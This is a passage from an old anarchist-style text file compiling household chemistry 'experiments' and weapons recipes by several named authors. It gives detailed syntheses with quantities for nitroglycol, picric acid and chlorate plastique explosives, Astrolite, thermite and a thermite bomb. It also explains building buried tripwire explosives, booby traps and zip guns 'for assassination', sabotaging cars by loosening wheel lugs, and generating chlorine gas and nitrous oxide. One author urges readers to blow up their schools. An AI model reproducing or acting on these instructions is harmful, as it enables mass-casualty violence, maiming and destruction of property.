depending on the concentration of certain chemicals in different areas and
brands.  I would suggest that the person doing these experiments have some
knowledge of chemistry, especially for the more dangerous experiments.

 I am not responsible for any injury or damage caused by people using this
information.  It is provided for use by people knowledgable in chemistry who
are interested in such experiments and can safely handle such experiments.

I.  A LIST OF HOUSEHOLD CHEMICALS AND THEIR COMPOSITION

VINEGAR: 3-5% ACETIC ACID              BAKING SODA: SODIUM BICARBONATE
DRAIN CLEANERS: SODIUM HYDROXIDE       SANI-FLUSH: 75% SODIUM BISULFATE
AMMONIA WATER: AMMONIUM HYDROXIDE      CITRUS FRUIT: CITRIC ACID
TABLE SALT: SODIUM CHLORIDE            SUGAR: SUCROSE
MILK OF MAGNESIA-MAGNESIUM HYDROXIDE   TINCTURE OF IODINE- 4% IODINE
RUBBING ALCOHOL- 70 OR 99% (DEPENDS ON BRAND) ISOPROPYL ALCOHOL (DO NOT DRINK!)


                           GENERATING CHLORINE GAS

 This is slightly more dangerous than the other two experiments, so you
shouild know what you're doing before you try this...

 Ever wonder why ammonia bottles always say 'do not mix with chlorine bleach',
and visa-versa? That's because if you mix ammonia water with ajax or something
like it, it will give off chlorine gas. To capture it, get a large bottle and
put ajax in the bottom.  then pour some ammonia down into the bottle.  since
the c hlorine is heavier than air, it will stay down in there unless you use
large amounts of either ajax or ammonia (don't!).


                            CHLORINE + TURPENTINE

 Take a small cloth or rag and soak it in turpentine. Quickly drop it into the
bottle of chlorine. It should give off a lot of black smoke and probably start
burning...

                           GENERATING HYDROGEN GAS

 To generate hydrogen, all you need is an acid and a metal that will react
with that acid.  Try vinegar (acetic acid) with zinc, aluminum, magnesium,
etc.  You can collect hydrogen in something if you note that it is lighter
than air....  light a small amount and it burns with a small *pop*.

  Another way of creating hydrogen is by the electrolysis of water.  this
involve sseperating water (H2O) into hydrogen and oxygen by an electric
current. To do this, you need a 6-12 volt battery (or a DC transformer), two
test tubes, a large bowl, two carbon electrodes (take them out of an unworking
6-12 volt battery), and table salt. Dissolve the salt in a large bowl full of
water. Submerge the two test tubes in the water and put the electrodes inside
them, with the mouth of the tube aiming down.  Connect the battery to some
wire going down to the electrodes.

   This will work for a while, but chlorine will be generated along with the
oxygen which will corrode your copper wires leading to the carbon
electrodes...  (the table salt is broken up into chlorine and sodium ions, the
chlorine comes off as a gas with oxygen while sodium reacts with the water to
form sodium hydroxide....).  therefore, if you can get your hands on some
sulfuric acid, use it instead.  it will not affect the reaction other than
making the water conduct electricity.

WARNING:  DO NOT use a transformer that outputs AC current! Not only is AC
         inherently more dangerous than DC, it also produces both Hydrogen and
         Oxygen at each electrode.


                             HYRDOGEN + CHLORINE

 Take the test tube of hydrogen and cover the mouth with your thumb. Keep it
inverted, and bring it near the bottle of chlorine (not one that has reacted
with turpentine).  Say "goodbye test tube", and drop it into the bottle.  The
hydrogen and chlorine should react and possibly explode (depending on purity
and amount of each gas).  An interesting thing about this is they will not
react if it is dark and no heat or other energy is around. When a light is
turned on, enough energy is present to cause them to react...

                            PREPARATION OF OXYGEN

    Get some hydrogen peroxide (from a drug store) and manganese dioxide (from
a battery- it's a black powder).  Mix the two in a bottle, and they give off
oxygen. If the bottle is stoppered, pressure will build up and shoot it off.

     Try lighting a wood splint and sticking it (when only glowing) into the
bottle. The oxygen will make it burst into flame. The oxygen will allow things
to burn better...

                                    IODINE

   Tincture of iodine contains mainly alcohol and a little iodine.  To
seperate them, put the tincture of iodine in a metal lid to a bottle and heat
it over a candle.  Have a stand holding another metal lid directly over the
tincture (about 4-6 inches above it) with ice on top of it.  The alcohol
should evaporate, and the iodine should sublime, but should reform iodine
crystals on the cold metal lid directly above.  If this works (I haven't
tried), you can use the iodine along with household ammonia to form nitrogen
triiodide.
                                            ...ZAPHOD BEEBLEBROX/MPG!

   I have found that Pool Chlorine tablets with strong household ammonia react
to produce LOTS of chlorine gas and heat... also mixing the tablets with
rubbing alcohol produces heat, a different (and highly flammable) gas, and
possibly some sort of acid (it eats away at just about anything it touches)

                                  TRIPWIRES
         by The Mortician

    Well first of all I reccommend that you read the file on my board about
landmines...  If you can't then here is the concept.

  You can use an m-80,h-100, blockbuster or any other type of explosive that
will light with a fuse. Now the way this works is if you have a 9 volt
battery, get either a solar igniter (preferably) or some steel wool you can
create a remote ignition system.  What you do it set up a schematic like this.

  ------------------>+ batery
 steel ||          ->- batery
 wool ||            /
 :==:--- <--fuse    \
  ||                /
  ---- spst switch--\

   So when the switch is on the currnet will flow through the steel wool or
igniter and heat up causing the fuse to light.
  Note: For use with steel wool try it first and get a really thin piece of
wire and pump the current through it to make sure it will heat up to light the
explosive.

   Now the thing to do is plant your explosive wherever you want it to be,bury
it and cover the wires.  Now take a fishing line (about 20 lb. test) and tie
one end to a secure object.  Have your switch secured to something and make a
loop on the other end on the line. Put the loop around the switch such that
when pulled it will pull the switch and set off the explosive.

  BOOBY TRAP TRIP WIRES......      BY Vlad Tepes (of Chgo C64 fame)

   Here is a method for constructing boobytraps which I personally invented,
and which I have found to work better than any other type of release booby
trap.

    There are many possible variations on this design, but the basic premise
remains the same. What you'll need:

  3-4 nails each 2 inches long and soft enough to
      bend easily (galvanized iron works well)
    6 feet of wire or fishing line
 5-15 feet of strong string or rope
    1 really sick mind.

    Hammer two of the nails into the trunk of a tree (about one inch apart) so
they form a horizontal line. They should be angled slightly upward, about 30
degrees.

    Bend each nail Downward about one inch out from the trunk. Take your
nefarious device (say a small rock suspended in a tree) and rig a rope or
string so the line comes DOWN towards the two nails. Tie a loop in the string
so the loop *just* reaches between the two nails, and pass a third nail
between the two nails with the loop around this nail between the two others
(see diagrams)

      bent nails
     /                        || ^ slight upward tension
# /\                          ||
#/                         @  ||    @         ( @ are the two nails, head on)

#          trip wire
 \                     /
Trunk                 third nail

    Now tie one end of the fishing line to the head of the third nail, and the
other end around another tree or to a nail (in another tree, a root or a
stump etc).

    When somebody pulls on the trip wire, the nail will be pulled out and your
sick creation will be released to do it's damage (try tying it to a firing
pin).

  There are several possible variations. More than one trip wire can be
attached to the same nail, or this device can be used to arm a second trip
wire. Large wire staples or hook and eye loops can be used to replace the two
bent nails.

     A more interesting variation uses a straight piece of metal rod with a
hole at each end, or with a short wire loop welded to each end. One end is
attached to the tripwire, the other is attached to a spring.

  SPRING     BOLT            Trip wire

    With this design the loop will be released if the tripwire is pulled or if
it is broken. The spring should be under moderate tension and well oiled.


                            Improvised Explosives
Gelatine Explosive from Anti-Freeze         Written by: The Lich

CAUTION: THIS FORMULA ASSUMES THAT THE MAKER HAS NO QUALMS ABOUT KILLING
         HIS/HER SELF IN THE PROCESS.

 This explosive is almost the same as the nitro-gelatin plastique explosive
exept that it is supple and pliable to -10 to -20 deg. C

   Antifreeze is easier to obtain than glycerine and is usually cheaper.  It
needs to be freed of water before the manufacture and this can be done by
treating it with calcium chloride until a specific gravity of 1.12 @ o deg.
C.  or 1.11 @ 20 deg.  C.  is obtained.

    This can be done by adding calcium chloride to the antifreeze and checking
with a hydrometer and continue to add calcium chloride until the proper
reading is obtained.  The antifreeze is then filtered to remove the calcium
chloride from the liquid.  This explosive is superior to nitro-gelatin in that
it is easier to collidon the IMR smokeless powder into the explosive and that
the 50/50 ether ethyl alcohol can be done away with.  It is superior in that
the formation of the collidon is done very rapidly by the nitroethelene
glycol.

   It's detonation properties are practically the same as the nitro-gelatine.
Like the nitro-gelatine it is highly flammable and if caught on fire the
chances are good that the flame will progress to detonation.  In this
explosive as in nitro-gelatine the addition of 1% sodium carbonate is a good
idea to reduce the chance of recidual acid being present in the final
explosive.  The following is a slightly different formula than nitro-gelatine:

Nitro-glycol 75%  Guncotton (IMR) 6%  Potassium Nitrate  14%   Flour 5%

    In this process the 50/50 step is omitted.  Mix the potassium nitrate with
the nitro-glycol.  Remember that this nitro-glycol is just as sensitive to
shock as is nitroglycerin.
    The next step is to mix in the baking flour and sodium carbonate. Mix
these by kneading with gloved hands until the mixture is uniform.  This
kneading should be done gently and slowly.  The mixture should be uniform when
the IMR smokeless powder is added.  Again this is kneaded to uniformity.  Use
this explosive as soon as possible.

    If it must be stored, store in a cool, dry place (0-10 deg.  C.).  This
explosive should detonate at 7600-7800 m/sec..  These two explosives are very
powerful and should be sensitive to a #6 blasting cap or equivelent.

    These explosives are dangerous and should not be made unless the
manufacturer has had experience with this type compound.  The foolish and
ignorant may as well forget these explosives as they won't live to get to use
them.
    Don't get me wrong, these explosives have been manufactured for years with
an amazing record of safety.  Millions of tons of nitroglycerine have been
made and used to manufacture dynamite and explosives of this nature with very
few mis haps.
   Nitroglycerin and nitroglycol will kill and their main victims are the
stupid and foolhardy.  Before manufacturing these explosives take a drop of
nitroglycerin and soak into a small piece of filter paper and place it on an
anvil.
  Hit this drop with a hammer and don't put any more on the anvil.  See what I
mean! This explosive compound is not to be taken lightly.  If there are any
doubts DON'T.

Improvised Explosives Plastique Explosive from Aspirin    by: The Lich

 This explosive is a phenol dirivative.  It is HIGHLY toxic and explosive
compounds made from picric acid are poisonous if inhaled, ingested, or handled
and absor- bed through the skin.  The toxicity of this explosive restrict's
its use due to the fact that over exposure in most cases causes liver and
kidney failure and sometimes death if immediate treatment is not obtained.

 This explosive is a cousin to T.N.T.  but is more powerful than it's cousin.
It is the first explosive used militarily and was adopted in 1888 as an
artillery shell filler.  Originally this explosive was derived from coal tar
but thanks to modern chemistry you can make this explosive easily in
approximately three hours from acetylsalicylic acid (aspirin purified).

 This procedure involves dissolving the acetylsalicylic acid in warm sulfuric
acid and adding sodium or potassium nitrate which nitrates the purified
aspirin and the whole mixture drowned in water and filtered to obtain the
final product.  This explosive is called trinitrophenol.  Care should be
taken to ensure that this explosive is stored in glass containers.  Picric
acid will form dangerous salts when allowed to contact all metals exept tin
and aluminum.  These salts are primary explosive and are super sensitive.
They also will cause the detonation of the picric acid.

 To make picric acid obtain some aspirin.  The cheaper brands work best but
buffered brands should be avoided.  Powder these tablets to a fine
consistancy. To extract the acetylsalicylic acid from this powder place this
powder in methyl alcohol and stir vigorously.  Not all of the powder will
dissolve.  Filter this powder out of the alcohol.  Again wash this powder that
was filtered out of the alcohol with more alcohol but with a lesser amount
than the first extraction.  Again filter the remaining powder out of the
alcohol.  Combine the now clear alcohol and allow it to evaporate in a pyrex
dish.  When the alcohol has evaporated there will be a surprising amount of
crystals in the bottom of the pyrex dish.

 Take forty grams of these purified acetylsalicylic acid crystals and
dissolve them in 150 ml.  of sulfuric acid (98%, specify gravity 1.8) and heat
to diss- olve all the crystals.  This heating can be done in a common electric
frying pan with the thermostat set on 150 deg.  F.  and filled with a good
cooking oil.

When all the crystals have dissolved in the sulfuric acid take the beaker,
that you've done all this dissolving in (600 ml.), out of the oil bath.  This
next step will need to be done with a very good ventilation system (it is a
good idea to do any chemistry work such as the whole procedure and any
procedure on this disk with good ventilation or outside).  Slowly start adding
58 g.  of sodium nitrate or 77 g.  of potassium nitrate to the acid mixture in
the beaker very slowly in small portions with vigorous stirring.  A red gas
(nitrogen trioxide) will be formed and this should be avoided.

  The mixture is likely to foam up and the addition should be stopped until
the foaming goes down to prevent the overflow of the acid mixture in the
beaker.  When the sodium or potassium nitrate has been added the mixture is
allowed to cool somewhat (30- 40 deg.  C.). The solution should then be dumped
slowly into twice it's volume of crushed ice and water.  The brilliant yellow
crystals will form in the water. These should be filtered out and placed in
200 ml.  of boiling distilled water. This water is allowed to cool and then
the crystals are then filtered out of the water.  These crystals are a very,
very pure trinitrophenol.  These crystals are then placed in a pyrex dish and
places in an oil bath and heated to 80 deg. C.  and held there for 2 hours.
This temperature is best maintained and checked with a thermometer.

  The crystals are then powdered in small quantities to a face powder
consistency.  These powdered crystals are then mixed with 10% by weight wax
and 5% vaseline which are heated to melting temperature and poured into the
crystals.  The mixing is best done by kneading together with gloved hands.
This explosive should have a useful plsticity range of 0-40 deg.  C..  The
detonation velocity should be around 7000 m/sec..  It is toxic to handle but
simply made from common ingredients and is suitable for most demolition work
requiring a moderately high detonation velocity.  It is very suitable for
shaped charges and some steel cutting charges.  It is not as good an explosive
as C-4 or other R.D.X.  based explosives but it is much easier to make.  Again
this explosive is very toxic and should be treated with great care.

  AVOID HANDLING BARE-HANDED, BREATHING DUST AND FUMES, AVOID ANY CHANCE OF
INGESTION. AFTER UTENSILS ARE USED FOR THE MANUFACTURE OF THIS EXPLOSIVE
RETIRE THEM FROM THE KITCHEN AS THE CHANCE OF POISONING IS NOT WORTH THE RISK.
THIS EXPLOSIVE, IF MANUFACTURED AS ABOVE, AHOULD BE SAFE IN STORAGE BUT WITH
ANY HOMEMADE EXPLOSIVE STORAGE OS NOT RECOMENDED AND EXPLOSIVES SHOULD BE MADE
UP AS NEEDED.


Improvised Explosives Plastique Explosive from Bleach     by: The Lich

 This explosive is a potassium chlorate explosive.  This explosive and
explosives of similar composition were used in World War II as the main
explosive filler in gernades, land mines, and mortar used by French, German,
and other forces involoved in that conflict.  These explosives are relatively
safe to manufacture.

  One should strive to make sure these explosives are free of sulfur,
sulfides, and picric acid.  The presence of these compounds result in mixtures
that are or can become highly sensitive and possibly decompose ex- plosively
while in storage.  The manufacture of this explosive from bleach is given as
just an expediant method.  This method of manufacturing potassium chlorate is
not economical due to the amount of energy used to boil the solution and cause
the 'dissociation' reaction to take place.  This procedure does work and
yields a relatively pure and a sulfur/sulfide free product.  These explosives
are very cap sensitive and require only a #3 cap for instigating detonation.

  To manufacture potassium chlorate from bleach (5.25% sodium hypochlorite
solution) obtain a heat source (hot plate etc.) a battery hydrometer, a large
pyrex or enameled steel container (to weigh chemicals), and some potassium
chloride (sold as salt substitute).  Take one gallon of bleach, place it in
the container and begin heating it.  While this solution heats, weigh out 63
g.  potassium chloride and add this to the bleach being heated. Bring this
solution to a boil and boiled until when checked by a hydrometer the reading
is 1.3 (if a battery hydrometer is used it should read full charge).

 When the reading is 1.3 take the solution and let it cool in the refrigerator
until it's between room temperature and 0 deg.  C..  Filter out the crystals
that have formed and save them.  Boil the solution again until it reads 1.3 on
the hydrometer and again cool the solution.  Filter out the crystals that have
formed and save them.  Boil this solution again and cool as before.

  Filter and save the crystals.  Take these crystals that have been saved and
mix them with distilled water in the following proportions: 56 g.  per 100 ml.
distilled water.  Heat this solution until it boils and allow it to cool.
Filter the solution and save the crystals that form upon cooling.  The process
if purifi- cation is called fractional crystalization.  These crystals should
be relatively pure potassium chlorate.

 Powder these to the consistency of face powder (400 mesh) and heat gently to
drive off all moisture.  Melt five parts vasoline and five parts wax.
Dissolve this in white gasoline (camp stove gasoline) and pour this liquid on
90 parts potassium chlorate (the crystals from the above operation) in a
plastic bowl. Knead this liquid into the potassium chlorate until immediately
mixed.  Allow all the gasoline to evaporate.  Place this explosive in a cool,
dry place.  Avoid friction, sulfur, sulfide, and phosphorous compounds.

     This explosive is best molded to the desired shape and density
(1.3g./cc.) and dipped in wax to water proof.  These block type charges
guarantee the highest detonation velocity.  This explosive is really not
suited to use in shaped charge applications due to its relatively low
detonation velocity.  It is comparable to 40% ammonia dynamite and can be
considered the same for the sake of charge computation.

    If the potassium chlorate is bought and not made it is put into the
manufacture pro- cess in the powdering stages preceding the addition of the
wax/vaseline mix- ture.  This explosive is bristant and powerful.  The
addition of 2-3% aluminum powder increases its blast effect.  Detonation
velocity is 3300 m/sec..


Plastique Explosives From Swimming Pool Chlorinating Compound    By the Lich

 This explosive is a chlorate explosive from bleach.  This method of
production of potassium or sodium chlorate is easier and yields a more pure
product than does the plastique explosive from bleach process.

  In this reaction the H.T.H. (calcium hypochlorite CaC10) is mixed with water
and heated with either sodium chloride (table salt, rock salt) or potassium
chloride (salt substitute).  The latter of these salts is the salt of choice
due to the easy crystalization of the potassium chlorate.

  This mixture will need to be boiled to ensure complete reaction of the
ingredients.  Obtain some H.T.H.  swimming pool chlorination compound or
equivilant (usually 65% calcium hypochlorite).  As with the bleach process
mentioned earlier the reaction described below is also a dissociation
reaction.  In a large pyrex glass or enamled steel container place 1200g.
H.T.H. and 220g.  potassium chloride or 159g.  sodium chloride.  Add enough
boiling water to dissolve the powder and boil this solution.  A chalky
substance (calcium chloride) will be formed.  When the formation of this
chalky substance is no longer formed the solution is filtered while boiling
hot.  If potassium chloride was used potassium chlorate will be formed.

    This potassium chlorate will drop out or crystalize as the clear liquid
left after filtering cools.  These crystals are filtered out when the solution
reaches room temperature.  If the sodium chloride salt was used this clear
filtrate (clear liquid after filter- ation) will need to have all water
evaporated.  This will leave crystals which should be saved.

    These crystals should be heated in a slightly warm oven in a pyrex dish to
drive off all traces of water (40-75 deg.  C.).  These crystals are ground to
a very fine powder (400 mesh).

    If the sodium chloride salt is used in the initial step the crystalization
is much more time consuming.  The potassium chloride is the salt to use as the
resulting product will crystalize out of the solution as it cools.  The
powdered and completely dry chlorate crystals are kneaded together with
vaseline in a plastic bowl.  ALL CHLORATE BASED EXPLOSIVES ARE SENSITIVE TO
FRICTION AND SHOCK AND THESE SHOULD BE AVOIDED.  If sodium chloride is used in
this explosive it will have a tendancy to cake and has a slightly lower
detonation velocity.

  This explosive is composed of the following:

 potassium/sodium chlorate 90%        vaseline  10%

   Simply pour the powder into a plastic baggy and knead in the vaseline
carefully. this explosive (especially if the Sodium Chlorate variation is
used) should not be exposed to water or moisture.

 The detonation velocity can be raised to a slight extent by the addition of
2-3% aluminum substituted for 2-3% of the vaseline.  This addition of this
aluminum will give the explosive a bright flash if set off at night which will
ruin night vision for a short while.  The detonation velocity of this
explosive is approximately 3200 m/sec.  for the potassium salt and 2900 m/sec.
for the sodium salt based explosive.

Addendum 4/12/91:

   It was claimed above that this explosive degrades over time. I would assume
that this occurs due to the small amount of water present in the vaseline, and
that a different type of fuel would be better than the vaseline.


ASSORTED NASTIES:

                                  Sweet-Oil
 In this one you open there hood and pour some honey in their oil spout.  if
you have time you might remover the oil plug first and drain some of the oil
out.  I have tried this one but wasn't around to see the effects but I am sure
that I did some damage.

                                   Slow Air
 Ok, sneak up the victims car and poke a small hole somewhere in 2 of his/her
tires.  They only have 1 spare.  Now if the hole is small but there then there
tire will go flat some where on the road.  You could slice the tire so this is
blows out on the road wih a razor blade.  Cut a long and fairly deep (don't
cut a hole all the way through) and peel a little bit of the rubber back and
cut that off.  Now very soon there tires will go flat or a possible blow out
at a high speed if your lucky.

                               Vanishing Paint
 Spread a little gas or paint thiner on the victims car and this will make his
paint run and fade.  Vodka will eat the paint off and so will a little 190.
Eggs work great on paint if they sit there long enough.

                                 Loose Wheel
 Loosen the lugs on you victums tires so that they will soon fall off.  This
can really fuck some one up if they are cruising when the tire falls off.

                                 Dual Neutral
   This name sucks but pull the 10 bolt or what ever they have there off.  (On
the real wheels, in the middle of the axle) Now throw some screws, blots, nuts
and assorted things in there and replace the cover. At this point you could
chip some of the teeth off the gears.

                                  Un-Midaser
 Crawl under there car with a rachet and losen all the nuts on their exhaust
so that it hangs low and will fall off soon. This method also works on
transmissions but is a little harder to get all bolts off, but the harder you
work the more you fuck them over.


                                 LAUGHING GAS

Learn how to make laughing gas from ammonium nitrate. Laughing gas was one of
the earliest anaesthetics.  After a little while of inhaling the gas the
patient became so happy [ain't life great?] he couldn't keep from laughing.
Finally he would drift off to a pleasant sleep.

   Some do-it-yourselfers have died while taking laughing gas.  This is
because they has generated it through plastic bags while their heads were
inside. They were simply suffocating but were too bombed out to realize it.
   The trick is to have a plastic clothes bag in which you generate a lot of
the gas.  Then you stop generating the gas and hold a small opening of the bag
under your nose, getting plenty of oxygen in the meantime.  Then, Whee!
  To make it you start with ammonium nitrate bought from a chemical supply
house or which you have purified with 100% rubbing or wood alcohol.

  First, dissolve a quantity of ammonium nitrate in some water.  Then you
evaporate the water over the stove, while stirring, until you have a heavy
brine.  When nearly all the moisture is out it should solidify instantly when
a drop is put on an ice cold metal plate.

  When ready, dump it all out on a very cold surface.  After a while, break
it up and store it in a bottle.

   A spoonful is put into a flask with a one-hole stopper, with a tube leading
into a big plastic bag.  The flask is heated with an alcohol lamp.

   When the temperature in the flask reaches 480 F the gas will generate.  If
white fumes appear the heat should be lowered as the stuff explodes at 600 F.

  When the bag is filled, stop the action and get ready to turn on.

CAUTION:  N2O supplants oxygen in your blood, but you don't realize it.  It's
        easy to die from N2O because you're suffocating and your breathing
        reflex doesn't know it.  Do not put your head in a plastic bag
        (duhh...) because you will cheerfully choke to death.

                              PIPE OR "ZIP" GUNS

    Commonly known as "zip" guns, guns made from pipe have been used for years
by juvenile punks.  Today's Militants   make them just for the hell of it or
to shoot once in an   assassination or riot and throw away if there is any
danger of apprehension.

    They can be used many times but with some, a length of dowel is needed to
force out the spent shell.

    There are many variations but the illustration shows the basic design.

    First, a wooden stock is made and a groove is cut for the barrel to rest
in.  The barrel is then taped securely to the stock with a good, strong
tape.

    The trigger is made from galvanized tin.  A slot is punched in the trigger
flap to hold a roofing nail, which is wired or soldered onto the flap.  The
trigger is bent and nailed to the stock on both sides.

    The pipe is a short length of one-quarter inch steel gas or water pipe
with a bore that fits in a cartridge, yet keeps the cartridge rim from passing
through the pipe.

    The cartridge is put in the pipe and the cap, with a hole bored through
it, is screwed on.  Then the trigger is slowly released to let the nail pass
through the hole and   rest on the primer.

    To fire, the trigger is pulled back with the left hand and held back with
the thumb of the right hand.  The gun is then aimed and the thumb releases the
trigger and the thing actually fires.

    Pipes of different lengths and diameters are found in any hardware store.
All caliber bullets, from the .22 to the .45 are used in such guns.

    Some zip guns are made from two or three pipes nested within each other.
For instance, a .22 shell will fit snugly into a length of a car's copper gas
line. Unfortunatey, the copper is too weak to withstand the pressure of the
firing.  So the length of gas line is spread   with glue and pushed into a
wider length of pipe.  This is   spread with glue and pushed into a length of
steel pipe with threads and a cap.

    Using this method, you can accomodate any cartridge, even a rifle shell.
The first size of pipe for a rifle   shell accomodates the bullet.  The second
accomodates its wider powder chamber.

    A 12-gauge shotgun can be made from a 3/4 inch steel pipe.  If you want to
comply with the gun laws, the barrel should be at least eighteen inches long.

    Its firing mechanism is the same as that for the pistol. It naturally has
a longer stock and its handle is lengthened into a rifle butt.  Also, a small
nail is driven half way into each side of the stock about four inches in the
front of the trigger.  The rubber band is put over one nail and   brought
around the trigger and snagged over the other nail.

    In case you actually make a zip gun, you should test it before firing it
by hand.  This is done by first tying the gun to a tree or post, pointed to
where it will do no damage.  Then a string is tied to the trigger and you go
off several yards.  The string is then pulled back and let go. If the barrel
does not blow up, the gun is (probably) safe to fire by hand. Repeat firings
may weaken the barrel, so NO zip gun can be considered "safe" to use.


Astrolite and Sodium Chlorate Explosives By: Future Spy & The Fighting Falcon

Note: Information on the Astrolite Explosives were taken from the book
 'Two Component High Explosive Mixtures' By Desert Pub'l

Some of the chemicals used are somewhat toxic, but who gives a fuck! Go ahead!
I won't even bother mentioning 'This information is for enlightening purposes
only'! I would love it if everyone made a gallon of astrolite and blew their
fucking school to kingdom scum!

                                  Astrolite

The astrolite family of liquid explosives were products of rocket propellant
research in the '60's.  Astrolite A-1-5 is supposed to be the world's most
powerful non-nuclear explosive -at about 1.8 to 2 times more powerful than
TNT. Being more powerful it is also safer to handle than TNT (not that it
isn't safe in the first place) and Nitroglycerin.

                                 Astrolite G
"Astrolite G is a clear liquid explosive especially designed to produce very
high detonation velocity, 8,600MPS (meters/sec.), compared with 7,700MPS for
nitroglycerin and 6,900MPS for TNT...In addition, a very unusual
characteristic is that it the liquid explosive has the ability to be absorbed
easily into the ground while remaining detonatable...In field tests, Astrolite
G has remained detonatable for 4 days in the ground, even when the soil was
soaked due to rainy weather" know what that means?....Astrolite Dynamite!

              To make (mix in fairly large container & outside)
    Two parts by weight of ammonium nitrate mixed with one part by weight
'anhydrous' hydrazine, produces Astrolite G...Simple enough eh? I'm sure that
the 2:1 ratio is not perfect,and that if you screw around with it long enough,
that you'll find a better formula.  Also, dunno why the book says 'anhydrous'
hydrazine, hydrazine is already anhydrous...

    Hydrazine is the chemical you'll probably have the hardest time getting
hold of. Uses for Hydrazine are: Rocket fuel, agricultural chemicals (maleic
hydra-zide), drugs (antibacterial and antihypertension), polymerization
catalyst, plating metals on glass and plastics, solder fluxes, photographic
developers, diving equipment.  Hydrazine is also the chemical you should be
careful with.

                              Astrolite A/A-1-5
Mix 20% (weight) aluminum powder to the ammonium nitrate, and then mix with
hydrazine.  The aluminum powder should be 100 mesh or finer.  Astrolite A has
a detonation velocity of 7,800MPS.

                                 Misc.  info
You should be careful not to get any of the astrolite on you,if it happens
though, you should flush the area with water.  Astrolite A&G both should be
able to be detonated by a #8 blasting cap.


                           Sodium Chlorate Formulas

Sodium Chlorate is similar to potassium chlorate,and in most cases can be a
substitute.  Sodium chlorate is also more soluble in water.  You can find
sodium chlorate at Channel or any hardware/home improvement store.  It is used
in blowtorches and you can get about 3lbs for about $6.00.

                          Sodium Chlorate Gunpowder

65% sodium chlorate, 22% charcoal, 13% sulfur, sprinkle some graphite on top.

                                 Rocket Fuel
6 parts sodium chlorate mixed *THOROUGHLY* with 5 parts rubber cement.

                      Rocket Fuel 2 (better performance)

50% sodium chlorate, 35% rubber cement ('One-Coat' brand),
10% epoxy resin hardener, 5% sulfur

You may want to add more sodium chlorate depending on the purity you are using.

                              Incendiary Mixture
55% aluminum powder (atomized), 45% sodium chlorate, 5% sulfur

                                Impact Mixture
50% red phosphorus, 50% sodium chlorate

Unlike potassium chlorate,sodium chlorate won't explode spontaneously when
mix- ed with phosphorus.  It has to be hit to be detonated.

                               Filler explosive
85% sodium chlorate, 10% vaseline, 5% aluminum powder

                            Nitromethane formulas
I thought that I might add this in since it's similar to Astrolite.

Nitromethane (CH3NO2)              specific gravity:1.139
flash point:95f                    auto-ignite:785f

Derivation: reaction of methane or propane with nitric acid under pressure.
Uses:       Rocket fuel; solvent for cellulosic compounds, polymers, waxes,
fats, etc.

To be detonated with a #8 cap, add:

1) 95% nitromethane + 5% ethylenediamine 2) 94% nitromethane + 6% aniline

Power output: 22-24% more powerful than TNT.  Detonation velocity of 6,200MPS.

                       Nitromethane 'solid' explosives
2 parts nitromethane, 5 parts ammonium nitrate (solid powder)

soak for 3-5 min.  when done,store in an air-tight container.  This is
supposed to be 30% more powerful than dynamite containing 60% nitro-glycerin,
and has 30% more brilliance.

                .... Thermite Incendiaries and Formulas ....



DISCLAIMER : The making and possesion of the following devices and mixtures
             is probably illegal in most communities. The incendiaries are
	     capable of burning in excess of 5400 degrees F. and are next
	     to impossible to extinguish. If you make them you accept all
	     responsibility for their possesion and use. You also accept
	     all responsibility for your own stupidity and carelessness.
	     This information is intended solely to educate.

                         All Formulas are by Weight

  Thermites are a group of pyrotechnics mixtures in which a reactive metal
reduces oxygen from a metallic oxide. This produces a lot of heat, slag and
pure metal. The most common themite is ferroaluminum thermite, made from
aluminum (reactive metal) and iron oxide (metal oxide). When it burns it
produces aluminum oxide (slag) and pure iron.
Thermite is usually used to cut or weld metal. As an experiment, a 3lb. brick
of thermite was placed on an aluminum engine block. After the thermite was
done burning, only a small portion of block was melted. However, the block
was very warped out of shape plus there were cracks all through the block.
Ferro-thermite produces about 930 calories per gram
The usual proportions of ferro-thermite are 25% aluminum and 75% iron oxide
The iron oxide usually used is not rust (Fe2O3) but iron scale (Fe3O4).Rust
will work but you may want to adjust the mixture to about 77% rust.
The aluminum is usually coarse powder to help slow down the burning rate.
The chemicals are mixed together thoroughly and compressed into a suitable
container. A first fire mix is poured on top and ignited.

NOTE: Thermites are generally very safe to mix and store. They are not shock
or friction sensitive and ignite at about 2000 degrees F.

A first fire mix is a mixture that ignites easier than thermite and burns
hot enough to light the thermite reliably. A very good one is :
                  Potassium Nitrate 5 parts
               Fine ground Aluminum 3 parts        
                             Sulfur 2 parts
			     
Mix the above thoroughly and combine 2 parts of it with 1 part of finely 
powdered ferro-thermite. The resulting mixture can be light by safety fuse
and burns intensely.


One problem with thermites is the difference in weight between the aluminum
and the oxide. This causes them to separate out rendering the thermite 
useless. One way to fix this is to use a binder to hold the chemicals to
each other. Sulfur is good for this. Called Diasite, this formula uses 
sulfur to bind all the chemicals together. It's drawback is the thermite 
must be heated to melt the sulfur.
                            Iron Oxide 70 %
			    Aluminum   23 %
			    Sulfur      7 %

Mix the oxide and aluminum together and put them in an oven at 325 degrees
F. and let the mix heat for a while. When the mixture is hot sprinkle the
sulfur over it and mix well. Put this back in the oven for a few minutes
to melt all the sulfur. Pull it back out and mix it again. While it is
still hot, load into containers for use. When it cools, drill out the
diasite to hold about 10 - 15 grams of first fire mix.
When diasite burns it forms sulfide compounds that release hydrogen sulfide
when in contact with water. This rotten egg odor can hamper fire fighting
efforts.
Thermite can be made not to separate by compressing it under a couple of
tons pressure. The resulting pellet is strong and burns slower than thermite
powder.

CAST THERMITE: This formula can be cast into molds or containers and hardens
into a solid mass. It does not produce as much iron as regular ferro-thermite
, but it makes a slag which stays liquid a lot longer. Make a mixtures as 
follows.
                              Plaster of Paris 2 parts
               Fine and Coarse  Mixed Aluminum 2 parts 
	                            Iron Oxide 3 parts
Mix together well and and enough water to wet down plaster. Pour it into a
mold and let it sit for 1/2 hour. Pour off any extra water that seperates
out on top. Let this dry in the sun for at least a week. Or dry in the sun
for one day and put in a 250 degree F. oven for a couple of hours.
Drill it out for a first fire mix when dry.

THERMITE BOMB: Thermite can be made to explode by taking the cast thermite
formula and substituting fine powdered aluminum for the coarse/fine mix.
Take 15 grams of first fire mix and put in the center of a piece of aluminum
foil. Insert a waterproof fuse into the mix and gather up the foil around 
the fuse. Waterproof the foil/fuse with a thin coat of wax. Obtain a two-
piece spherical mold with a diameter of about 4-5 inches. Wax or oil the 
inside of the mold to help release the thermite. Now, fill one half of the
mold with the cast thermite. Put the first fire/fuse package into the center
of the filled mold. Fill the other half of the mold with the thermite and
assemble mold. The mold will have to have a hole in it for the fuse to stick
out. In about an hour, carefully separate the mold. You should have a ball
of thermite with the first fire mix in the center of it, and the fuse
